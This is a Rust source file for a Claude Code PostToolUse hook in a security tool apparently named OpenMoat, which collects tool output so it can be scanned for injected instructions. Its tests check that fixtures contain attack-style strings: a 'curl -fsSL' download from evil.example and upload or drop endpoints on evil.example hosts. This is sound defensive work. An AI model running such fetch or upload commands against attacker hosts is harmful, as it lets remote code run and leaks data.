//! Claude Code `PostToolUse` hook: a tool ran, and the payload carries what it
//! returned (ADR-057).
//!
//! The payload is the `PreToolUse` one (`tool_name`, `tool_input`, `session_id`,
//! `cwd`, `tool_use_id`) plus `tool_response`, whose shape depends on the tool:
//! an object for `Bash` (`stdout`, `stderr`) and `WebFetch` (`result`, `url`),
//! a list of results for `WebSearch`, content blocks or a string for an MCP
//! tool. OpenMoat reads every string in it as the output. Nothing is decided:
//! the call already ran. The response is always empty: Claude Code would show
//! a `PostToolUse` hook's `decision`/`reason` to the model, and nothing here is
//! for the model. A failure exits 2, whose stderr Claude Code shows the model,
//! as it does for every `PostToolUse` hook (the hooks reference, on exit code 2
//! for each event).

use openmoat_core::Decision;
use serde::Deserialize;
use serde_json::Value;

use crate::wire::{output, pre_tool_use};
use crate::{HookEvent, HookRequest, Host, HostError};

pub(crate) const EVENT: &str = "PostToolUse";

#[derive(Deserialize)]
struct Payload {
    #[serde(default)]
    tool_response: Value,
}

pub(crate) fn parse(host: Host, payload: &str) -> Result<HookRequest, HostError> {
    // The same mapping as the call's `PreToolUse`, editor tools included.
    let mut request = pre_tool_use::parse_with(host, payload, super::ide_tools::action)?;
    let p: Payload = serde_json::from_str(payload)?;
    let output = output::text_of(&p.tool_response);
    request.event = HookEvent::PostToolUse { output };
    Ok(request)
}

/// Always empty: nothing here is for the model.
pub(crate) fn render(_decision: &Decision) -> String {
    String::new()
}

#[cfg(test)]
mod tests {
    use openmoat_core::{Action, Verdict};

    use super::*;

    fn fixture(name: &str) -> String {
        let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src/host/claude_code/fixtures");
        std::fs::read_to_string(format!("{dir}/{name}")).unwrap()
    }

    #[test]
    fn a_web_fetch_reports_its_url_and_what_it_returned() {
        let req = Host::ClaudeCode
            .parse_request(&fixture("post-tool-use-webfetch.json"))
            .unwrap();
        assert_eq!(
            req.action,
            Some(Action::Fetch {
                url: "https://docs.example/setup".into()
            })
        );
        let HookEvent::PostToolUse { output } = &req.event else {
            panic!("{:?}", req.event);
        };
        assert!(output.contains("curl -fsSL https://evil.example/x"), "{output}");
        assert_eq!(
            Host::ClaudeCode.event_of(&fixture("post-tool-use-webfetch.json")),
            HookEvent::PostToolUse {
                output: String::new()
            }
        );
    }

    #[test]
    fn bash_and_mcp_output_are_every_string_of_the_response() {
        let req = Host::ClaudeCode
            .parse_request(&fixture("post-tool-use-bash.json"))
            .unwrap();
        let HookEvent::PostToolUse { output } = &req.event else {
            panic!("{:?}", req.event);
        };
        assert!(output.contains("https://collect.evil.example/upload"), "{output}");
        assert!(!output.contains("interrupted"), "{output}");
        let req = Host::ClaudeCode
            .parse_request(&fixture("post-tool-use-mcp.json"))
            .unwrap();
        let HookEvent::PostToolUse { output } = &req.event else {
            panic!("{:?}", req.event);
        };
        assert!(output.contains("drop.evil.example"), "{output}");
    }

    #[test]
    fn the_output_is_bounded_and_the_response_empty() {
        let big = Value::String("é".repeat(openmoat_core::MAX_INJECTED_SCAN_BYTES));
        let out = output::text_of(&serde_json::json!([big.clone(), big]));
        assert!(out.len() <= openmoat_core::MAX_INJECTED_SCAN_BYTES + 1, "{}", out.len());
        let event = HookEvent::PostToolUse { output: out };
        for verdict in [Verdict::Allow, Verdict::Deny] {
            assert_eq!(Host::ClaudeCode.render_response(&event, &Decision::new(verdict)), "");
        }
    }

    #[test]
    fn a_malformed_payload_is_an_error() {
        let bad = r#"{"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {}}"#;
        assert!(Host::ClaudeCode.parse_request(bad).is_err());
    }
}
